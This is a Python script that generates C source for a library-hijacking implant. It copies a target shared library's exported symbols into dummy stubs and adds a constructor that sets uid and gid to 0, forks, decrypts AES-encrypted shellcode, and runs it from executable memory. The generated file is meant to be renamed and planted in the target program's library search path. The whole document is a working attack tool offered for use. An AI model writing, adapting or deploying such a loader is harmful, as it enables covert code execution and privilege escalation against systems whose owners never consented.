#!/usr/bin/env python3
"""
Generate a hijack .so source file from any target shared library.

Reads exported symbols from the target .so via readelf and generates
a C source with dummy stubs + the AES shellcode constructor payload.

Usage:
    python3 gen-hijack-lib.py /path/to/libtarget.so.2 > hijack.c
"""
import subprocess
import sys
import re
import os

TEMPLATE_HEADER = """\
/*
 * Auto-generated hijack library targeting: {libname}
 * Symbols extracted from: {target_path}
 *
 * Rename to {libname} and place in target's library search path.
 */

#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"
#include "shellcode.h"

static void payload(void) __attribute__((constructor));

/* --- {count} symbol stubs from {libname} --- */

"""

TEMPLATE_PAYLOAD = """
/* --- payload --- */

void payload(void) {
    setuid(0);
    setgid(0);

    pid_t pid = fork();
    if (pid != 0)
        return;

    int pt_len = aes_decrypt_ecb(shellcode, shellcode_len, aes_key, shellcode);
    if (pt_len < 0)
        _exit(1);

    void *mem = mmap(NULL, (size_t)pt_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
        _exit(1);

    memcpy(mem, shellcode, (size_t)pt_len);
    ((void(*)())mem)();
    _exit(0);
}
"""

# Names that would clash with our payload code
RESERVED = {"payload", "shellcode", "shellcode_len", "plaintext_len", "aes_key",
            "aes_decrypt_ecb", "aes_inv_cipher", "aes_key_expansion", "main"}


def extract_symbols(target_path):
    """Extract exported (defined, non-local) symbols with their types from a .so."""
    result = subprocess.run(
        ["readelf", "-Ws", "--dyn-syms", target_path],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"error: readelf failed: {result.stderr.strip()}", file=sys.stderr)
        sys.exit(1)

    symbols = {}  # name -> type (FUNC or OBJECT)
    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) < 8:
            continue

        # Num: Value Size Type Bind Vis Ndx Name
        ndx, name, sym_type, bind = parts[6], parts[7], parts[3], parts[4]

        if ndx in ("UND", "ABS"):
            continue
        if bind == "LOCAL":
            continue
        if sym_type not in ("FUNC", "OBJECT"):
            continue

        name = name.split("@@")[0].split("@")[0]

        if not name or not re.match(r'^[a-zA-Z_]\w*$', name):
            continue
        if name in RESERVED:
            continue

        symbols[name] = sym_type

    return dict(sorted(symbols.items()))


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} /path/to/libtarget.so", file=sys.stderr)
        sys.exit(1)

    target_path = sys.argv[1]
    if not os.path.isfile(target_path):
        print(f"error: {target_path}: not found", file=sys.stderr)
        sys.exit(1)

    libname = os.path.basename(target_path)
    symbols = extract_symbols(target_path)

    if not symbols:
        print(f"error: no exported symbols found in {target_path}", file=sys.stderr)
        sys.exit(1)

    funcs = {k: v for k, v in symbols.items() if v == "FUNC"}
    objs = {k: v for k, v in symbols.items() if v == "OBJECT"}

    print(TEMPLATE_HEADER.format(
        libname=libname, target_path=target_path, count=len(symbols)
    ), end="")

    for sym in funcs:
        print(f"long {sym}() {{ return 0; }}")
    for sym in objs:
        print(f"int {sym};")

    print(TEMPLATE_PAYLOAD)

    print(f"// {len(funcs)} functions + {len(objs)} objects from {libname}", file=sys.stderr)


if __name__ == "__main__":
    main()
